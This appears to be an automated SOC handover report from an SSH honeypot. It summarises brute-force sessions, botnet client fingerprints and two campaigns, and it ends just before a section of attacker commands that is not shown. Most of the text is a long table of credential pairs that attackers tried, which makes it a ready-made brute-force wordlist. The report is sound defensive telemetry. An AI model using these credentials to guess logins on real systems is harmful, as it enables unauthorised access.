# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-05 |
| **Generated At** | 2026-09-05T20:09:03Z |
| **Shift Time** | 20:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **461** |
| Confirmed Threats | **428** |
| False Positives Filtered | **33** (7.2%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **26** |
| High Severity Cases | **328** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **133** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **355** |
| Unique Credential Pairs | **301** |
| Unique Usernames | **207** |
| Unique Passwords | **269** |
| Successful Auth Pairs | **326** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 60 |
| `admin` | 17 |
| `345gs5662d34` | 15 |
| `ubuntu` | 8 |
| `support` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `support` | 8 |
| `123456` | 8 |
| `` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `support` | `support` | 8 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `` | 6 |
| `ubnt` | `12345` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubnt` | `12345` | `138.226.239.234` | 2026-09-05T15:05:57 |
| `root` | `mousepad` | `10.0.0.73` | 2026-09-05T15:16:06 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-05T15:16:10 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T15:16:11 |
| `ubuntu` | `abc@123` | `10.0.0.73` | 2026-09-05T15:18:28 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T15:18:32 |
| `ubnt` | `12345` | `10.0.0.73` | 2026-09-05T15:22:35 |
| `ubnt` | `12345` | `138.226.239.233` | 2026-09-05T15:23:40 |
| `elena` | `elena` | `10.0.0.73` | 2026-09-05T15:24:24 |
| `elena` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T15:24:27 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-05T15:27:41 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-05T15:27:41 |
| `uucp` | `uucp` | `138.226.239.234` | 2026-09-05T15:28:35 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-05T15:38:34 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-05T15:45:21 |
| `username` | `password` | `138.226.239.233` | 2026-09-05T15:51:47 |
| `support` | `support` | `77.90.185.17` | 2026-09-05T15:53:25 |
| `support` | `support` | `10.0.0.73` | 2026-09-05T15:57:25 |
| `support` | `support` | `176.53.159.196` | 2026-09-05T16:03:32 |
| `PlcmSpIp` | `PlcmSpIp` | `177.30.68.202` | 2026-09-05T16:23:59 |
| `345gs5662d34` | `345gs5662d34` | `177.30.68.202` | 2026-09-05T16:24:02 |
| `PlcmSpIp` | `3245gs5662d34` | `177.30.68.202` | 2026-09-05T16:24:03 |
| `gbase` | `123456` | `116.203.18.194` | 2026-09-05T16:29:06 |
| `345gs5662d34` | `345gs5662d34` | `116.203.18.194` | 2026-09-05T16:29:08 |
| `gbase` | `3245gs5662d34` | `116.203.18.194` | 2026-09-05T16:29:09 |
| `root` | `asd123` | `152.89.12.101` | 2026-09-05T16:30:07 |
| `345gs5662d34` | `345gs5662d34` | `152.89.12.101` | 2026-09-05T16:30:10 |
| `root` | `3245gs5662d34` | `152.89.12.101` | 2026-09-05T16:30:11 |
| `root` | `Ww112233` | `156.235.89.172` | 2026-09-05T16:32:01 |
| `345gs5662d34` | `345gs5662d34` | `156.235.89.172` | 2026-09-05T16:32:03 |
| `root` | `3245gs5662d34` | `156.235.89.172` | 2026-09-05T16:32:04 |
| `root` | `r00t1234!` | `222.71.205.34` | 2026-09-05T16:32:38 |
| `345gs5662d34` | `345gs5662d34` | `222.71.205.34` | 2026-09-05T16:32:43 |
| `root` | `3245gs5662d34` | `222.71.205.34` | 2026-09-05T16:32:45 |
| `gao` | `gao` | `152.32.150.26` | 2026-09-05T16:33:16 |
| `345gs5662d34` | `345gs5662d34` | `152.32.150.26` | 2026-09-05T16:33:18 |
| `gao` | `3245gs5662d34` | `152.32.150.26` | 2026-09-05T16:33:18 |
| `astra` | `123456` | `45.177.147.146` | 2026-09-05T16:34:05 |
| `345gs5662d34` | `345gs5662d34` | `45.177.147.146` | 2026-09-05T16:34:08 |
| `astra` | `3245gs5662d34` | `45.177.147.146` | 2026-09-05T16:34:09 |
| `ubnt` | `12345` | `77.90.185.17` | 2026-09-05T16:38:36 |
| `root` | `123qwerty` | `2.57.122.168` | 2026-09-05T16:43:58 |
| `uucp` | `uucp` | `77.90.185.17` | 2026-09-05T16:45:56 |
| `root` | `21` | `2.57.122.168` | 2026-09-05T16:47:14 |
| `rise` | `password` | `107.180.88.176` | 2026-09-05T16:47:32 |
| `345gs5662d34` | `345gs5662d34` | `107.180.88.176` | 2026-09-05T16:47:34 |
| `rise` | `3245gs5662d34` | `107.180.88.176` | 2026-09-05T16:47:35 |
| `root` | `my@123456` | `165.154.255.63` | 2026-09-05T16:50:07 |
| `345gs5662d34` | `345gs5662d34` | `165.154.255.63` | 2026-09-05T16:50:09 |
| `root` | `3245gs5662d34` | `165.154.255.63` | 2026-09-05T16:50:10 |
| `root` | `321` | `2.57.122.168` | 2026-09-05T16:50:20 |
| `root` | `123abc!!!` | `212.64.201.210` | 2026-09-05T16:51:30 |
| `345gs5662d34` | `345gs5662d34` | `212.64.201.210` | 2026-09-05T16:51:33 |
| `root` | `3245gs5662d34` | `212.64.201.210` | 2026-09-05T16:51:34 |
| `root` | `4321` | `2.57.122.168` | 2026-09-05T16:53:57 |
| `root` | `54321` | `2.57.122.168` | 2026-09-05T16:57:36 |
| `root` | `P4ssw0rd` | `2.57.122.168` | 2026-09-05T17:00:59 |
| `root` | `P4ssword` | `2.57.122.168` | 2026-09-05T17:04:23 |
| `root` | `P@ssw0rd` | `2.57.122.168` | 2026-09-05T17:07:35 |
| `root` | `Passw0rd` | `2.57.122.168` | 2026-09-05T17:11:19 |
| `root` | `letmein` | `2.57.122.168` | 2026-09-05T17:14:59 |
| `root` | `p4ssword` | `2.57.122.168` | 2026-09-05T17:18:50 |
| `root` | `p@ssw0rd` | `2.57.122.168` | 2026-09-05T17:22:43 |
| `root` | `passw0rd` | `2.57.122.168` | 2026-09-05T17:25:44 |
| `svn-cmu` | `svn-cmu` | `159.223.174.116` | 2026-09-05T17:28:04 |
| `bruno` | `bruno` | `159.223.174.116` | 2026-09-05T17:28:20 |
| `adil` | `adil` | `159.223.174.116` | 2026-09-05T17:28:35 |
| `jmantovani` | `jmantovani` | `159.223.174.116` | 2026-09-05T17:28:50 |
| `maryam` | `maryam` | `159.223.174.116` | 2026-09-05T17:29:04 |
| `root` | `password` | `2.57.122.168` | 2026-09-05T17:29:10 |
| `peterw` | `peterw` | `159.223.174.116` | 2026-09-05T17:29:19 |
| `sybase` | `sybase` | `159.223.174.116` | 2026-09-05T17:29:33 |
| `sekar` | `sekar` | `159.223.174.116` | 2026-09-05T17:30:02 |
| `rahul` | `rahul` | `159.223.174.116` | 2026-09-05T17:30:17 |
| `tellier` | `tellier` | `159.223.174.116` | 2026-09-05T17:30:31 |
| `teller` | `teller` | `159.223.174.116` | 2026-09-05T17:30:45 |
| `test.hpc` | `test.hpc` | `159.223.174.116` | 2026-09-05T17:30:59 |
| `test.hpe` | `test.hpe` | `159.223.174.116` | 2026-09-05T17:31:13 |
| `hpe` | `hpe@123` | `159.223.174.116` | 2026-09-05T17:31:27 |
| `hpe` | `Hpe123` | `159.223.174.116` | 2026-09-05T17:31:41 |
| `hpe` | `Hpe@2026` | `159.223.174.116` | 2026-09-05T17:31:55 |
| `grid` | `grid` | `159.223.174.116` | 2026-09-05T17:32:09 |
| `ADDSPG` | `ADDSPG` | `159.223.174.116` | 2026-09-05T17:32:23 |
| `ADDHOST` | `ADDHOST` | `159.223.174.116` | 2026-09-05T17:32:37 |
| `brian` | `brian` | `159.223.174.116` | 2026-09-05T17:32:51 |
| `root` | `Jenkins` | `159.223.174.116` | 2026-09-05T17:33:06 |
| `jenkins` | `Jenkins` | `159.223.174.116` | 2026-09-05T17:33:20 |
| `postgres` | `Postgres` | `159.223.174.116` | 2026-09-05T17:33:34 |
| `nexpose` | `nexpose` | `159.223.174.116` | 2026-09-05T17:34:03 |
| `customer` | `customer` | `159.223.174.116` | 2026-09-05T17:34:17 |
| `root` | `123@@@` | `165.1.75.106` | 2026-09-05T17:34:29 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-09-05T17:34:30 |
| `root` | `welcome123###` | `159.223.174.116` | 2026-09-05T17:34:32 |
| `customer` | `jenkins` | `159.223.174.116` | 2026-09-05T17:34:47 |
| `avalanchejs` | `avalanchejs` | `159.223.174.116` | 2026-09-05T17:35:01 |
| `bill` | `bill` | `159.223.174.116` | 2026-09-05T17:35:15 |
| `user01` | `user01` | `159.223.174.116` | 2026-09-05T17:35:30 |
| `user01` | `user01@123` | `159.223.174.116` | 2026-09-05T17:35:44 |
| `anna` | `123456` | `159.223.174.116` | 2026-09-05T17:35:59 |
| `ubuntu` | `welcome` | `159.223.174.116` | 2026-09-05T17:36:13 |
| `ubuntu` | `Welcome` | `159.223.174.116` | 2026-09-05T17:36:27 |
| `relay` | `relay` | `103.213.238.91` | 2026-09-05T17:36:31 |
| `345gs5662d34` | `345gs5662d34` | `103.213.238.91` | 2026-09-05T17:36:35 |
| `relay` | `3245gs5662d34` | `103.213.238.91` | 2026-09-05T17:36:38 |
| `root` | `welcome` | `159.223.174.116` | 2026-09-05T17:36:41 |
| `root` | `Welcome` | `159.223.174.116` | 2026-09-05T17:36:55 |
| `root` | `Welcome1` | `159.223.174.116` | 2026-09-05T17:37:10 |
| `root` | `welcome1` | `159.223.174.116` | 2026-09-05T17:37:23 |
| `nocld` | `nocld` | `159.223.174.116` | 2026-09-05T17:37:38 |
| `user1` | `user01@123` | `159.223.174.116` | 2026-09-05T17:37:52 |
| `dbadmin` | `dbadmin` | `159.223.174.116` | 2026-09-05T17:38:06 |
| `ftp` | `1q2w3e4r` | `159.223.174.116` | 2026-09-05T17:38:20 |
| `AvalancheJS` | `AvalancheJS` | `159.223.174.116` | 2026-09-05T17:38:34 |
| `frp` | `frp` | `159.223.174.116` | 2026-09-05T17:38:49 |
| `ftp` | `1qaz2wsx3edc` | `159.223.174.116` | 2026-09-05T17:39:03 |
| `fcadmin` | `fcadmin` | `159.223.174.116` | 2026-09-05T17:39:18 |
| `ftadmin` | `ftadmin` | `159.223.174.116` | 2026-09-05T17:39:32 |
| `fadmin` | `fadmin` | `159.223.174.116` | 2026-09-05T17:39:47 |
| `aadmin` | `aadmin` | `159.223.174.116` | 2026-09-05T17:40:01 |
| `zadmin` | `zadmin` | `159.223.174.116` | 2026-09-05T17:40:16 |
| `bashadmin` | `bashadmin` | `159.223.174.116` | 2026-09-05T17:40:30 |
| `system` | `system1234` | `159.223.174.116` | 2026-09-05T17:40:45 |
| `system` | `1` | `159.223.174.116` | 2026-09-05T17:41:00 |
| `system` | `123` | `159.223.174.116` | 2026-09-05T17:41:14 |
| `sys` | `sys` | `159.223.174.116` | 2026-09-05T17:41:29 |
| `sys` | `123` | `159.223.174.116` | 2026-09-05T17:41:44 |
| `root` | `!QAZ2wsx` | `159.223.174.116` | 2026-09-05T17:41:58 |
| `cintu` | `QAZ2wsx` | `159.223.174.116` | 2026-09-05T17:42:13 |
| `sister` | `sister` | `159.223.174.116` | 2026-09-05T17:42:27 |
| `root` | `PASSW0RT` | `159.223.174.116` | 2026-09-05T17:42:41 |
| `arthur` | `arthur` | `159.223.174.116` | 2026-09-05T17:42:55 |
| `colum` | `colum` | `159.223.174.116` | 2026-09-05T17:43:10 |
| `emanuela` | `emanuela` | `159.223.174.116` | 2026-09-05T17:43:24 |
| `root` | `qwerty` | `2.57.122.168` | 2026-09-05T17:43:28 |
| `nabeel` | `nabeel` | `159.223.174.116` | 2026-09-05T17:43:38 |
| `judy` | `judy` | `159.223.174.116` | 2026-09-05T17:43:53 |
| `zhiyuan` | `zhiyuan` | `159.223.174.116` | 2026-09-05T17:44:07 |
| `timra` | `timra` | `159.223.174.116` | 2026-09-05T17:44:21 |
| `sms` | `sms` | `159.223.174.116` | 2026-09-05T17:44:35 |
| `hive` | `hive` | `159.223.174.116` | 2026-09-05T17:44:49 |
| `tahmid` | `tahmid` | `159.223.174.116` | 2026-09-05T17:45:04 |
| `mahafto` | `ralbank.co.inMahaft0@123` | `159.223.174.116` | 2026-09-05T17:45:18 |
| `ftmfto` | `5Mahaft0@123` | `159.223.174.116` | 2026-09-05T17:45:32 |
| `charles` | `charles` | `159.223.174.116` | 2026-09-05T17:45:47 |
| `jonathan` | `jonathan` | `159.223.174.116` | 2026-09-05T17:46:01 |
| `sparveen` | `sparveen` | `159.223.174.116` | 2026-09-05T17:46:15 |
| `helena` | `helena` | `159.223.174.116` | 2026-09-05T17:46:30 |
| `mthakkar` | `mthakkar` | `159.223.174.116` | 2026-09-05T17:46:45 |
| `shabuland` | `shabuland` | `159.223.174.116` | 2026-09-05T17:46:59 |
| `bwang` | `bwang` | `159.223.174.116` | 2026-09-05T17:47:14 |
| `admin` | `123456abc` | `159.223.174.116` | 2026-09-05T17:47:29 |
| `admin` | `Domaytimrapass!@#` | `159.223.174.116` | 2026-09-05T17:47:43 |
| `qtcapthap7` | `Mayhack=cho123` | `159.223.174.116` | 2026-09-05T17:47:58 |
| `qtcapthap6` | `Domitimra!@#456` | `159.223.174.116` | 2026-09-05T17:48:13 |
| `admin` | `Thuych90ung()` | `159.223.174.116` | 2026-09-05T17:48:27 |
| `root` | `R00t@123` | `159.223.174.116` | 2026-09-05T17:48:42 |
| `cience` | `cience` | `159.223.174.116` | 2026-09-05T17:48:56 |
| `root` | `root1` | `2.57.122.168` | 2026-09-05T17:48:57 |
| `carlota` | `carlota` | `159.223.174.116` | 2026-09-05T17:49:10 |
| `erp` | `erp` | `159.223.174.116` | 2026-09-05T17:49:25 |
| `science` | `science` | `159.223.174.116` | 2026-09-05T17:49:39 |
| `mapr` | `mapr` | `159.223.174.116` | 2026-09-05T17:49:53 |
| `mapper` | `mapper` | `159.223.174.116` | 2026-09-05T17:50:08 |
| `vg01` | `vg01` | `159.223.174.116` | 2026-09-05T17:50:22 |
| `bitquery` | `bitquery` | `159.223.174.116` | 2026-09-05T17:50:36 |
| `react` | `react` | `159.223.174.116` | 2026-09-05T17:50:50 |
| `nattan` | `nattan` | `159.223.174.116` | 2026-09-05T17:51:04 |
| `nnon` | `nnon` | `159.223.174.116` | 2026-09-05T17:51:18 |
| `root` | `root12` | `2.57.122.168` | 2026-09-05T17:51:23 |
| `admin` | `admin!@` | `159.223.174.116` | 2026-09-05T17:51:33 |
| `user` | `user!@` | `159.223.174.116` | 2026-09-05T17:51:47 |
| `charon` | `charon` | `159.223.174.116` | 2026-09-05T17:52:02 |
| `loki` | `loki123` | `159.223.174.116` | 2026-09-05T17:52:16 |
| `loki` | `loki` | `159.223.174.116` | 2026-09-05T17:52:31 |
| `mathias` | `mathias` | `159.223.174.116` | 2026-09-05T17:52:45 |
| `neehal` | `neehal` | `159.223.174.116` | 2026-09-05T17:53:00 |
| `yban` | `yban` | `159.223.174.116` | 2026-09-05T17:53:15 |
| `jimmy` | `Jimmy` | `159.223.174.116` | 2026-09-05T17:53:30 |
| `nvidia` | `nvidia` | `159.223.174.116` | 2026-09-05T17:53:44 |
| `yolo` | `yolo` | `159.223.174.116` | 2026-09-05T17:54:00 |
| `root` | `root123` | `2.57.122.168` | 2026-09-05T17:54:00 |
| `sdadmin` | `51nGleD` | `159.223.174.116` | 2026-09-05T17:54:14 |
| `oraadmin` | `51nGleD` | `159.223.174.116` | 2026-09-05T17:54:29 |
| `root` | `asdfghjkl;'` | `180.76.236.214` | 2026-09-05T17:54:33 |
| `345gs5662d34` | `345gs5662d34` | `180.76.236.214` | 2026-09-05T17:54:38 |
| `root` | `3245gs5662d34` | `180.76.236.214` | 2026-09-05T17:54:39 |
| `root` | `cisco` | `159.223.174.116` | 2026-09-05T17:54:44 |
| `export` | `export` | `159.223.174.116` | 2026-09-05T17:54:58 |
| `eth` | `eth` | `159.223.174.116` | 2026-09-05T17:55:13 |
| `ug20181203` | `ug20181203` | `159.223.174.116` | 2026-09-05T17:55:28 |
| `ug20201180` | `ug20201180` | `159.223.174.116` | 2026-09-05T17:55:42 |
| `aiga` | `aiga` | `159.223.174.116` | 2026-09-05T17:55:56 |
| `eero` | `eero` | `159.223.174.116` | 2026-09-05T17:56:11 |
| `cellik` | `cellik` | `159.223.174.116` | 2026-09-05T17:56:25 |
| `root` | `root2026` | `2.57.122.168` | 2026-09-05T17:56:35 |
| `seoy` | `seoy` | `159.223.174.116` | 2026-09-05T17:56:39 |
| `mina` | `mina` | `159.223.174.116` | 2026-09-05T17:56:54 |
| `thiti` | `thiti` | `159.223.174.116` | 2026-09-05T17:57:08 |
| `angela` | `angela` | `159.223.174.116` | 2026-09-05T17:57:22 |
| `sumi` | `sumi` | `159.223.174.116` | 2026-09-05T17:57:37 |
| `yoon` | `yoon` | `159.223.174.116` | 2026-09-05T17:57:51 |
| `docker` | `docker` | `159.223.174.116` | 2026-09-05T17:58:05 |
| `yuliya` | `yuliya` | `159.223.174.116` | 2026-09-05T17:58:20 |
| `xiond` | `xiond` | `159.223.174.116` | 2026-09-05T17:58:34 |
| `xion` | `xion` | `159.223.174.116` | 2026-09-05T17:58:49 |
| `root` | `welcome` | `2.57.122.168` | 2026-09-05T17:59:03 |
| `watch` | `watch` | `159.223.174.116` | 2026-09-05T17:59:03 |
| `tower` | `tower` | `159.223.174.116` | 2026-09-05T17:59:18 |
| `watchtower` | `watchtower` | `159.223.174.116` | 2026-09-05T17:59:33 |
| `movies` | `movies` | `159.223.174.116` | 2026-09-05T17:59:48 |
| `bitrix` | `12345678` | `159.223.174.116` | 2026-09-05T18:00:03 |
| `citrix` | `12345678` | `159.223.174.116` | 2026-09-05T18:00:19 |
| `bitrix` | `bitrix24` | `159.223.174.116` | 2026-09-05T18:00:34 |
| `bitrix` | `bitrix123` | `159.223.174.116` | 2026-09-05T18:00:49 |
| `bitrix` | `123456` | `159.223.174.116` | 2026-09-05T18:01:03 |
| `bitrix` | `Bitrix@123` | `159.223.174.116` | 2026-09-05T18:01:19 |
| `bitrix` | `Admin@123` | `159.223.174.116` | 2026-09-05T18:01:35 |
| `bitrix` | `bitrix2026` | `159.223.174.116` | 2026-09-05T18:01:48 |
| `bitrix` | `password` | `159.223.174.116` | 2026-09-05T18:02:02 |
| `abas` | `abas` | `159.223.174.116` | 2026-09-05T18:02:17 |
| `user` | `cklee` | `159.223.174.116` | 2026-09-05T18:02:32 |
| `medicine` | `medicine` | `159.223.174.116` | 2026-09-05T18:02:46 |
| `researchlab` | `researchlab` | `159.223.174.116` | 2026-09-05T18:03:00 |
| `research` | `research` | `159.223.174.116` | 2026-09-05T18:03:14 |
| `ubuntu` | `researchlab` | `159.223.174.116` | 2026-09-05T18:03:29 |
| `ubuntu` | `research!@#$` | `159.223.174.116` | 2026-09-05T18:03:43 |
| `human` | `human` | `159.223.174.116` | 2026-09-05T18:03:58 |
| `resources` | `resources` | `159.223.174.116` | 2026-09-05T18:04:13 |
| `resource` | `resource` | `159.223.174.116` | 2026-09-05T18:04:27 |
| `sol` | `sol` | `159.223.174.116` | 2026-09-05T18:04:42 |
| `admin` | `admin!@34` | `159.223.174.116` | 2026-09-05T18:04:57 |
| `trafficmanager` | `trafficmanager` | `159.223.174.116` | 2026-09-05T18:05:11 |
| `root` | `!@34` | `159.223.174.116` | 2026-09-05T18:05:26 |
| `ubuntu` | `!@34` | `159.223.174.116` | 2026-09-05T18:05:41 |
| `user` | `!@34%^` | `159.223.174.116` | 2026-09-05T18:05:56 |
| `root` | `!@34%^` | `159.223.174.116` | 2026-09-05T18:06:11 |
| `gcp-user` | `gcp-user` | `159.223.174.116` | 2026-09-05T18:06:26 |
| `oms-user` | `oms-user` | `159.223.174.116` | 2026-09-05T18:06:41 |
| `omstest` | `omstest` | `159.223.174.116` | 2026-09-05T18:06:56 |
| `cms` | `cms` | `159.223.174.116` | 2026-09-05T18:07:12 |
| `opc` | `opc` | `159.223.174.116` | 2026-09-05T18:07:27 |
| `ubuntu` | `123456` | `159.223.174.116` | 2026-09-05T18:07:41 |
| `ryan` | `ryan` | `159.223.174.116` | 2026-09-05T18:07:56 |
| `kubai` | `kubai` | `159.223.174.116` | 2026-09-05T18:08:11 |
| `inspur` | `123456` | `159.223.174.116` | 2026-09-05T18:08:25 |
| `Michael` | `Michael` | `159.223.174.116` | 2026-09-05T18:08:40 |
| `Ephraim` | `Ephraim` | `159.223.174.116` | 2026-09-05T18:08:55 |
| `Jeffrey` | `Jeffrey` | `159.223.174.116` | 2026-09-05T18:09:09 |
| `lisa` | `lisa` | `159.223.174.116` | 2026-09-05T18:09:24 |
| `Miri` | `Miri` | `159.223.174.116` | 2026-09-05T18:09:38 |
| `patrick` | `patrick` | `159.223.174.116` | 2026-09-05T18:09:52 |
| `ladmin` | `ladmin` | `159.223.174.116` | 2026-09-05T18:10:07 |
| `grafana` | `grafana` | `159.223.174.116` | 2026-09-05T18:10:22 |
| `logistics` | `logistics` | `159.223.174.116` | 2026-09-05T18:10:37 |
| `admin` | `antminermonitor` | `159.223.174.116` | 2026-09-05T18:10:51 |
| `lhvalidator` | `lhvalidator` | `159.223.174.116` | 2026-09-05T18:11:06 |
| `lhconsensus` | `lhconsensus` | `159.223.174.116` | 2026-09-05T18:11:21 |
| `user` | `1` | `159.223.174.116` | 2026-09-05T18:11:35 |
| `shardeum` | `shardeum` | `159.223.174.116` | 2026-09-05T18:11:50 |
| `quant` | `quant` | `159.223.174.116` | 2026-09-05T18:12:05 |
| `baikal` | `baikal` | `159.223.174.116` | 2026-09-05T18:12:20 |
| `root` | `envision` | `159.223.174.116` | 2026-09-05T18:12:35 |
| `root` | `blacksheepwall` | `159.223.174.116` | 2026-09-05T18:12:51 |
| `ren` | `ren` | `159.223.174.116` | 2026-09-05T18:13:06 |
| `node` | `node` | `159.223.174.116` | 2026-09-05T18:13:21 |
| `admin` | `NodeAdmin@#4M0N1T0R!?` | `159.223.174.116` | 2026-09-05T18:13:36 |
| `cehao` | `cehao` | `159.223.174.116` | 2026-09-05T18:13:51 |
| `mhuo` | `mhuo` | `159.223.174.116` | 2026-09-05T18:14:06 |
| `emeriom1` | `emeriom1` | `159.223.174.116` | 2026-09-05T18:14:21 |
| `jbrancal` | `jbrancal` | `159.223.174.116` | 2026-09-05T18:14:36 |
| `mangrich` | `mangrich` | `159.223.174.116` | 2026-09-05T18:14:50 |
| `yiheng` | `yiheng` | `159.223.174.116` | 2026-09-05T18:15:05 |
| `xzhu` | `xzhu` | `159.223.174.116` | 2026-09-05T18:15:19 |
| `mcpantel` | `mcpantel` | `159.223.174.116` | 2026-09-05T18:15:34 |
| `yixiao` | `yixiao` | `159.223.174.116` | 2026-09-05T18:15:48 |
| `bli` | `bli` | `159.223.174.116` | 2026-09-05T18:16:03 |
| `emma` | `emma` | `159.223.174.116` | 2026-09-05T18:16:32 |
| `jioh` | `jioh` | `159.223.174.116` | 2026-09-05T18:16:46 |
| `mfeucht` | `mfeucht` | `159.223.174.116` | 2026-09-05T18:17:01 |
| `reshi` | `reshi` | `159.223.174.116` | 2026-09-05T18:17:16 |
| `msc_lab` | `msc_lab` | `159.223.174.116` | 2026-09-05T18:17:46 |
| `msc` | `msc` | `159.223.174.116` | 2026-09-05T18:18:01 |
| `centos` | `centos12#$` | `159.223.174.116` | 2026-09-05T18:18:17 |
| `centos` | `centos!@#$` | `159.223.174.116` | 2026-09-05T18:18:32 |
| `centos` | `123456` | `159.223.174.116` | 2026-09-05T18:18:47 |
| `centos` | `centos` | `159.223.174.116` | 2026-09-05T18:19:03 |
| `redhat` | `redhat123` | `159.223.174.116` | 2026-09-05T18:19:18 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `194.187.179.172` | 2026-09-05T18:19:26 |
| `redhat` | `Redhat1234` | `159.223.174.116` | 2026-09-05T18:19:34 |
| `redhat` | `RedHat` | `159.223.174.116` | 2026-09-05T18:19:49 |
| `scanner` | `scanner` | `159.223.174.116` | 2026-09-05T18:20:04 |
| `locked` | `locked` | `159.223.174.116` | 2026-09-05T18:20:19 |
| `lock` | `lock` | `159.223.174.116` | 2026-09-05T18:20:34 |
| `root` | `Admin@123` | `159.223.174.116` | 2026-09-05T18:20:49 |
| `admin` | `Admin@123` | `159.223.174.116` | 2026-09-05T18:21:05 |
| `root` | `redhat` | `159.223.174.116` | 2026-09-05T18:21:35 |
| `root` | `redhat123` | `159.223.174.116` | 2026-09-05T18:21:50 |
| `yash` | `yash` | `159.223.174.116` | 2026-09-05T18:22:04 |
| `cheikh` | `cheikh` | `159.223.174.116` | 2026-09-05T18:22:34 |
| `ethan` | `ethan` | `159.223.174.116` | 2026-09-05T18:22:49 |
| `minjune` | `minjune` | `159.223.174.116` | 2026-09-05T18:23:18 |
| `samay` | `samay` | `159.223.174.116` | 2026-09-05T18:23:32 |
| `steven` | `steven` | `159.223.174.116` | 2026-09-05T18:23:47 |
| `edward` | `edward` | `159.223.174.116` | 2026-09-05T18:24:17 |
| `jeremy` | `jeremy` | `159.223.174.116` | 2026-09-05T18:24:32 |
| `martin` | `martin` | `159.223.174.116` | 2026-09-05T18:24:48 |
| `netdata` | `netdata` | `159.223.174.116` | 2026-09-05T18:25:02 |
| `wex` | `wex` | `159.223.174.116` | 2026-09-05T18:25:18 |
| `vanish` | `vanish` | `159.223.174.116` | 2026-09-05T18:25:33 |
| `auxs` | `auxs` | `159.223.174.116` | 2026-09-05T18:25:48 |
| `usb` | `usb` | `159.223.174.116` | 2026-09-05T18:26:03 |
| `usb0` | `usb0` | `159.223.174.116` | 2026-09-05T18:26:19 |
| `usb1` | `usb1` | `159.223.174.116` | 2026-09-05T18:26:34 |
| `yuyan` | `yuyan` | `159.223.174.116` | 2026-09-05T18:26:49 |
| `zadtoota` | `zadtoota` | `159.223.174.116` | 2026-09-05T18:27:04 |
| `Puneet` | `Puneet` | `159.223.174.116` | 2026-09-05T18:27:19 |
| `zarka` | `zarka` | `159.223.174.116` | 2026-09-05T18:27:33 |
| `zielinma` | `zielinma` | `159.223.174.116` | 2026-09-05T18:27:48 |
| `teamspeak` | `teamspeak` | `159.223.174.116` | 2026-09-05T18:28:03 |
| `ts3` | `ts3` | `159.223.174.116` | 2026-09-05T18:28:18 |
| `csgoserver` | `csgoserver` | `159.223.174.116` | 2026-09-05T18:28:32 |
| `csgo` | `csgo` | `159.223.174.116` | 2026-09-05T18:28:47 |
| `Alto` | `Alto` | `159.223.174.116` | 2026-09-05T18:29:02 |
| `yuea` | `yuea` | `159.223.174.116` | 2026-09-05T18:29:17 |
| `Solutions` | `Solutions` | `159.223.174.116` | 2026-09-05T18:29:31 |
| `voth` | `voth` | `159.223.174.116` | 2026-09-05T18:29:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **461** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 285 |
| libssh | 49 |
| OpenSSH | 9 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 254 | 1 |
| `f555226df196...` | Mirai/variant | 34 | 12 |
| `2ec37a7cc8da...` | Mirai/variant | 22 | 1 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `1f2f2f9b0a73...` | Mirai/variant | 5 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 254 | 1 | Generic scanner |
| `f555226df196...` | libssh | 34 | 12 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 22 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `1f2f2f9b0a73...` | libssh | 5 | 2 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `390ffe68a68c...` | OpenSSH | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 20 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
